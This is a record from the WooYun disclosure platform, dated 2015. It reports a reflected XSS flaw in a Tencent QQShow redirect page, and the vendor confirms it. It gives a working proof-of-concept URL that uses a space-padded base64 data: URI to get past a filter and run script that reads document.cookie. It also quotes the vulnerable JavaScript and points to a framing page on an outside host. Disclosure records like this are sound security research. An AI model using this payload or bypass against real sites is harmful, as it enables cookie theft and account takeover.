{"id": 74017, "wybug_id": "wooyun-2015-0165988", "wybug_title": "腾讯某站XSS跨站可打cookies", "wybug_corp": "腾讯", "wybug_author": "thx", "wybug_date": "2015-12-30 11:56", "wybug_open_date": "2016-02-12 18:49", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向公众公开  简要描述： 麻烦验证的时候能刷新几次，知道管理很忙，不可能都细看，但菜鸟对找到的漏洞有多重视你可能想像不到。 详细说明：  如果提示501，请刷新一下，第一次打开提示501真不知道为什么...仅对firefox有效，效果： http://imgcache.qq.com/qqshow_v3/htdocs/live/yaohe/jumppage.html?url=data:text/html%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==框架调用：http://qz6666.com/1.html\n\n 漏洞处源码： \n<script type=\"text/javascript\"> var PAGE = { ... Jump : function(){ var iUin = QSFL.excore.getURLParam(\"uin\"); var sUrl = unescape(QSFL.excore.getURLParam(\"url\")); PAGE.SendUserPV(); QSFL.mall.sendPGV('yaohe.show.lady.' + iUin ); /* var oPgv = new GetJs(\"http://pingjs.qq.com/ping.js\", pageView); oPgv.init(); */ setTimeout(function(){window.location.href=sUrl}, 300) } }; PAGE.Jump(); </script>\n QSFL.excore.getURLParam没找到，应该是对data:text/html;base64过滤不完善，多加几个空格就绕过了。 另附一个任意框架，暂时不知道怎么利用： http://show.qq.com/show_v3.html?MUrl=/../../qqshow_v3/htdocs/live/yaohe/jumppage.html%3furl%3dhttp://www.baidu.com\n\n   漏洞证明：  如果提示501，请刷新一下，第一次打开提示501真不知道为什么...http://imgcache.qq.com/qqshow_v3/htdocs/live/yaohe/jumppage.html?url=data:text/html%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==框架调用：http://qz6666.com/1.html\n\n   修复方案：     版权声明：转载请注明来源 thx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-12-30 16:16 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-30 16:19 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1023 漏洞数:235        | 1.乌云最帅的男人                        ...)\t\t \n  贴吧？    \n     2015-12-30 16:50 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 每日必关注乌云)\t\t \n      \n     2015-12-30 18:49 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:208 漏洞数:57        | 工欲善其事，必先利其器)\t\t \n  刷的DZ    \n     2015-12-30 21:15 |    \t\t金馆长 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | Up)\t\t \n  吃惊    \n     2015-12-30 21:39 |    \t\t狮子找女友 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  和补天提交的一样么    \n     2015-12-31 00:25 |    \t\tSneer \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一根小白菜)\t\t \n  你提交的这些xss了有意思么兄弟    也不是自己挖的   我觉得真的没这个必要    \n     2015-12-31 00:31 |    \t\tSneer \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一根小白菜)\t\t \n  看错了不好意思  尴尬尴尬   忽略上一条评论    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}